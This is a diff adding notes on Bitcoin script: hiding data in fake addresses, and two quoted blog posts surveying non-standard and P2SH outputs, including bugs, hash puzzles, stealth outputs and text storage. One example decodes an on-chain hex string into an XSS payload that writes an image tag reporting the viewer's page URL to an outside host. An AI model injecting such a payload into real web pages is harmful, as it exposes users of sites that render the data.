@@ -62,6 +62,14 @@ Bob will not allow an early close of the contract, Alice will have to wait for h
 
 See also: [Secure Multiparty Computations on Bitcoin](http://eprint.iacr.org/2013/784.pdf)
 
+# Exploiting the blockchain to store information
+
+How to use the blockchain to store data encoded in hexadecimal, such as the image of Nelson Mandela.
+
+Send a tiny amount of bitcoins to fake addresses such as 15gHNr4TCKmhHDEG31L2XFNvpnEcnPSQvd. This address is stored in the blockchain as hex 334E656C736F6E2D4D616E64656C612E6A70673F. If you convert those hex bytes to Unicode, you get the string `Nelson-Mandela.jpg`, representing the image filename. Similarly, addresses encode the data for the image. Thus, text, images, and other content can be stored on the blockchain by using correctly-calculated fake addresses.
+
+Explanation taken from [Ken Shirrif’s blog](http://www.righto.com/2014/02/ascii-bernanke-wikileaks-photographs.html)
+
 
 # Script language
 
@@ -355,6 +363,179 @@ This transaction was successfully spent by *09f691b2263260e71f363d1db51ff3100d28
 Note that while transactions like this are fun, they are not secure, because they do not contain any signatures and thus any transaction attempting to spend them can be replaced with a different transaction sending the funds somewhere else.
 
 ---
+
+[Antoine Le Calvet](https://medium.com/@alcio/a-look-at-bitcoin-non-standard-outputs-c97f65cccbb6)
+
+## A look at Bitcoin non-standard outputs
+
+Bitcoin transactions are validated using [https://en.bitcoin.it/wiki/Script](https://en.bitcoin.it/wiki/Script). Nowadays, the great majority of users and wallets use standard scripts forms, [http://p2sh.info](http://p2sh.info). The remaining 0.01% of non-standard outputs use more complex script forms, represent challenges, or just are the result of bugs. In this post, I’ll look at some different families of non-standard outputs. The data was collected using [https://github.com/alecalve/bitcoin-blockchain-parser](https://github.com/alecalve/bitcoin-blockchain-parser) a Python 3 library I wrote to parse bitcoind database files.
+
+### The Bitcoin script language
+
+Present since the first version of Bitcoin, but absent from [https://bitcoin.org/bitcoin.pdf](https://bitcoin.org/bitcoin.pdf) the Bitcoin script language is stack based, like [https://en.wikipedia.org/wiki/Forth_%28programming_language%29](https://en.wikipedia.org/wiki/Forth_%28programming_language%29), and is used to validate transactions. In order to spend Bitcoins, a user must provide the missing part of a script that describes how to spend them. This makes Bitcoin a programmable money.
+
+The most common script form is called [https://en.bitcoin.it/wiki/Transaction#Pay-to-PubkeyHash](https://en.bitcoin.it/wiki/Transaction#Pay-to-PubkeyHash). When redeeming Bitcoins secured by this script form, the user must provide a public key corresponding to a given hash and then sign the transaction with the private key, hence proving he owns the coins.
+
+The available instruction set is not limited to cryptographic operations and allows users to build complex scripts. Conditional flow, arithmetic operations, hash functions, etc. can be used to validate transactions. However, a lot of instructions, such as most of the string related operations as well as some arithmetic and bitwise logic operators, are disabled due to security concerns.
+
+
+### Mistakes and bugs
+
+Some non-standard scripts are visibly the result of mistakes or bugs.
+
+Between February 2nd, 2012 and April 1st, 2012, a bug in P2Pool software created a bogus output at the end of every coinbase of the majority of the blocks the pool mined. The total amount lost was 0.60280235 BTC. This bogus output was:
+
+    OP_IFDUP OP_IF OP_2SWAP OP_VERIFY OP_2OVER OP_DEPTH
+
+This script does not make any sense and is not even valid as the OP_IF is not closed by a corresponding OP_ENDIF. However, we can understand what happened by looking at the script’s ascii value: “script”. A discussion of the event is available on this [https://bitcointalk.org/index.php?topic=67158.0](https://bitcointalk.org/index.php?topic=67158.0).
+
+Another series of non-standard outputs due to a bug occured on November 28th, 2011. In these outputs, the script structure is identical to a Pay-To-PubkeyHash output, with the difference that the pubkeyhash is set to a null byte, making them unspendable. This time, the outputs represents a value of 2609.36304319 BTC, around $8000 at that time. A [https://bitcointalk.org/index.php?topic=50206.0](https://bitcointalk.org/index.php?topic=50206.0) indicates that this mistake was made by MtGox and represented a loss of one week of their BTC-only revenue.
+
+### Hash function challenges
+
+Another family of non-standard outputs uses the presence of standard hash functions in the script instruction set to create challenges. These outputs can only be spent by providing data that once hashed by a cryptographic function is equal to a given hash.
+
+Using such outputs to secure Bitcoins is not secure at all as anyone can reproduce a transaction spending such outputs. At least 55 outputs used this technique, representing a combined value of 2.04 BTC. At the moment I write these lines, only 5 of these outputs remain unpsent, with a combined value of 1.0056 BTC. The biggest [https://blockchain.info/tx/af32bb06f12f2ae5fdb7face7cd272be67c923e86b7a66a76ded02d954c2f94d](https://blockchain.info/tx/af32bb06f12f2ae5fdb7face7cd272be67c923e86b7a66a76ded02d954c2f94d) (1 BTC) is interesting. In order to spend it, you must provide data that gives the following hash when hashed twice using SHA-256:
+
+    000000000019d6689c085ae165831e934ff763ae46a2a6c172b3f1b60a8ce26f
+
+This is the hash of the genesis block, but as block hashes’ string are represented as the inverse of their hexadecimal value, this script is for the moment unredeemable.
+
+### Stealth outputs
+
+Some non-standard outputs are just standard outputs in disguise, using the OP_DROP operator to add data that is discarded during verification.
+
+For example, in this [https://blockchain.info/tx/c0b2cf75b47d1e7f48cdb4287109ff1dd5bcf146d5f77a9e8784c0c9c0ef02ad](https://blockchain.info/tx/c0b2cf75b47d1e7f48cdb4287109ff1dd5bcf146d5f77a9e8784c0c9c0ef02ad), the script :
+
+    54686543616b654973414c69650a OP_DROP
+    OP_DUP OP_HASH160
+    d92d8d187f3bf869c1695bba74a9c57a4a84f0b1
+    OP_EQUALVERIFY OP_CHECKSIG
+
+was used to send 0.2 BTC to the address 1LoLCaTphKrx1ohbRu7r8rPDr5sNq3Kqbg without any block explorer indexing the address.
+
+Only 8 outputs used this technique, the most recent dating back to May 2014, for a combined value of 0.335 BTC.
+
+### Trivial scripts
+
+Some scripts are trivial to solve, for example, OP_1, which is in itself a valid script or OP_MIN OP_3 OP_EQUAL, used 4 times, which requires to provide 2 numbers of which the smallest is 3.
+
+Some scripts represent more complex mathematical equations, such as:
+
+    OP_2DUP OP_ADD OP_8 OP_EQUALVERIFY OP_SUB OP_2 OP_EQUAL
+
+which represents the equation:
+
+    x + y - 8 = x - y - 2 = 0
+
+This script was redeemed using x=5 and y=3 (the only solution).
+
+Another equation can be found in this [https://blockchain.info/tx/a165c82cf21a6bae54dde98b7e00ab43b695debb59dfe7d279ac0c59d6043e24](https://blockchain.info/tx/a165c82cf21a6bae54dde98b7e00ab43b695debb59dfe7d279ac0c59d6043e24):
+
+    OP_ADD OP_ADD OP_13 OP_EQUAL 203c73637269707420747970653d27746578742f6a617661736372697074273e646f63756d656e742e777269746528273c696d67207372633d5c27687474703a2f2f7777772e74726f6c6c626f742e6f72672f7873732d626c6f636b636861696e2d6465746563746f722e7068703f62633d62746326687265663d27202b206c6f636174696f6e2e68726566202b20275c273e27293b3c2f7363726970743e20 OP_DROP
+
+The script itself is made of two parts, a mathematical equation :
+
+    x + y + z = 13
+
+And an XSS detector, a hex value is pushed then dropped from the stack and represents the ascii for:
+
+    &lt;script type=’text/javascript’&gt;document.write(‘&lt;img src=\’http://www.trollbot.org/xss-blockchain-detector.php?bc=btc&amp;href=&#39; + location.href + ‘\’&gt;’);&lt;/script&gt;
+
+This output was [https://blockchain.info/tx-index/58459652](https://blockchain.info/tx-index/58459652) with the numbers 4, 6 and 3.
+
+
+### Conclusion
+
+This post does not cover all the non-standard scripts present in the blockchain but highlight some I found interesting to explain. Some websites, such as [http://bitcoinstrings.com](http://bitcoinstrings.com), or this very complete [http://www.righto.com/2014/02/ascii-bernanke-wikileaks-photographs.html](http://www.righto.com/2014/02/ascii-bernanke-wikileaks-photographs.html) found out other interesting data hidden in the blockchain.
+
+
+## Non-standard P2SH scripts
+
+In [a previous article](https://medium.com/@alcio/a-look-at-bitcoin-non-standard-outputs-c97f65cccbb6), I explored different forms of non-standard scripts present in the Bitcoin blockchain. In this article, I’ll focus on non-standard scripts use in pay-to-script-hash (P2SH) transactions.
+
+### How does P2SH works?
+
+All bitcoins are secured by a script: a sequence of instructions describing how to spend the bitcoins it secures. When spending bitcoins, arguments resulting in a valid execution of the script must be provided. While the underlying language used for these scripts can handle many different operations (arithmetic, cryptography, string operations, …), only a few standard script templates are broadcasted by Bitcoin peers.
+
+Among them is P2SH, pay-to-script-hash. P2SH Bitcoin addresses (those beginning with a ‘3’) encode the cryptographic hash of a script, instead of encoding a ECDSA public key like the first version of Bitcoin addresses (beginning with a ‘1’). The hashed script, along with the arguments needed for its valid execution, are only revealed when spending the bitcoins sent to a P2SH address.
+
+The main use of P2SH is multisig, 99% of known P2SH scripts use it. The remaining 1% is what I explored.
+
+
+### Open Assets
+The main source of non standard P2SH scripts is the [Open Assets Protocol](https://github.com/OpenAssets/open-assets-protocol/blob/master/specification.mediawiki). Around 78% of the 31.300 non-standard scripts I studied were Open Assets definition pointers.
+
+Open Assets is a colored coins protocol that’s been implemented for Bitcoin. The goal of this protocol is to be able to define and trade real world assets using the Bitcoin blockchain. The first part in this protocol is inserting a reference to the asset definition (a document describing the asset, the conditions attached to it, the issuer’s identity, …) in the blockchain.
+
+The reference is usually the document’s hash160. It’s also possible to create a asset definition pointer by using the document’s URL and its SHA-256. However, this type of asset definition pointer is too big to be put in the marker output like the hash160. The solution is put to use P2SH to include arbitrary data in the blockchain. The marker data is inserted in a standard script but discarded when executing the script, hence making it present in the blockchain but not making the transaction unspendable.
+
+Around 24.000 thousands assets have been defined this way, the great majority (22.000) of these assets are stocks (from the NASDAQ’s website and stock.com), they were defined around July 21st, 2015.
+
+
+### Storing text
+From emails, code to advertising, the blockchain contains [a lot of text](http://bitcoinstrings.com/" data-href="http://bitcoinstrings.com/" class="markup--anchor markup--p-anchor" rel="nofollow). Even the first Bitcoin transaction ever contained the text:
+
+> The Times 03/Jan/2009 Chancellor on brink of second bailout for banks
+
+implying that the creation of Bitcoin was a reaction to the 2008 crisis.
+
+P2SH is convenient when storing text in the blockchain as it’s possible to store up to 1.5KB of text at a time.
+
+I focused on a specific type of script used to store text in the blockchain, it is the most common script used to that effect. Here’s an annotated example of this script storing a payload split in two parts:
+
+    &lt;signature&gt;                         # An ECDSA signature
+    &lt;text&gt; &lt;text&gt;                       # The text payload split in 2
+    OP_HASH160 &lt;hash160&gt; OP_EQUALVERIFY # Checking the 2nd part&#39;s hash
+    OP_HASH160 &lt;hash160&gt; OP_EQUALVERIFY # Checking the 1st part&#39;s hash
+    &lt;pk&gt; OP_CHECKSIGVERIFY              # Checking the signature
+    &lt;n&gt; OP_DROP                         # Pushing then dropping a number
+    OP_DEPTH OP_0 OP_EQUAL              # Checking if the stack is empty
+
+This kind of Bitcoin script comes from a [Python script](https://github.com/petertodd/checklocktimeverify-demos/blob/master/lib/python-bitcoinlib/examples/publish-text.py) authored by Peter Todd, a Bitcoin Core developer. Each part of the text is a line from the original text, the &lt;n&gt; OP_DROP part is just to ensure a unique script hash if the same text is used with the same public key, finally, the check for an empty stack is there to prevent script malleability.
+
+This first time this Python script was used was on April, 1st 2015 and consisted of publishing the Python script itself (PGP signed by Peter Todd) along with a rather nonsensical [Cointelegraph article](http://cointelegraph.com/news/113806/warning-kaspersky-alerts-users-of-malware-and-blockchain-abuse) mentioning «a small script embedded into the blockchain that either forces the download and install of more powerful code».
+
+Other texts included in the blockchain using this script are varied, from Neals Stephenson’s [Cryptonomicon](http://www.mit.edu/~yandros/doc/command.txt) and [Unix — The Hole Hawg](http://www.team.net/mjb/hawg.html), logs from the #bitcoin-wizards IRC channel, satoshi’s posts on Bitcointalk, bitcoin-dev mails and reddit comments.
+
+
+### Trivial scripts
+
+As with normal scripts, P2SH scripts also encode trivial scripts, that can be spent without providing any ECDSA signature nor hard work.
+
+For example, the script:
+
+    OP_3 OP_5 OP_4
+    OP_3DUP
+    OP_ADD OP_9 OP_EQUALVERIFY
+    OP_ADD OP_7 OP_EQUALVERIFY
+    OP_ADD OP_8 OP_EQUALVERIFY
+    OP_1
+
+encodes the equation system:
+
+    z + y = 9, z + x = 7, x + y = 8
+
+whose only solution is x=3, y=5 and z=4.
+
+This script’s address is 3MbZjYS1Kjo5An9vVCwZYTd2JeobwjUsFh and it was published and spent on November 21st, 2015.
+
+Another example of non-standard P2SH script is:
+
+    OP_1
+    1449587175 OP_CHECKLOCKTIMEVERIFY OP_DROP
+    OP_1 OP_ADD OP_2 OP_EQUAL
+
+
+This script uses the newest addition to the script instruction set: OP_CHECKLOCKTIMEVERIFY (CLTV). It’s a normal 1 + 1 = 2 script, with the twist that it can’t be spent until a given point in time.
+
+Introduced by [BIP-65](https://github.com/bitcoin/bips/blob/master/bip-0065.mediawiki), and [recently activated](http://bitcoin.sipa.be/ver-50k.png) in a softfork, CLTV allows users to make a transaction spendable only after a point in the future. For this example, this script was spendable only after December 8th, 2015 at 3:06pm (UTC) and was spent on December 8th, 2015 at 3:21pm (UTC) making it [the first transaction using CLTV](https://blockchain.info/tx/736cb277f098ea748e59b98f7c1287e10e4b53f30cb9de0761cc991aad8b28a8).
+
+### Conclusion
+
+Non-standard scripts are now mainly created using P2SH, in the last 2 months, only a handful of non-P2SH non-standard scripts have been mined. As for my previous article, I focused on scripts that I found interesting, not on all of the non-standard P2SH scripts.
+
+A list of all non-standard P2SH scripts is available at [this address](https://webbtc.com/p2sh_scripts/unknown).
 
 
 <!--
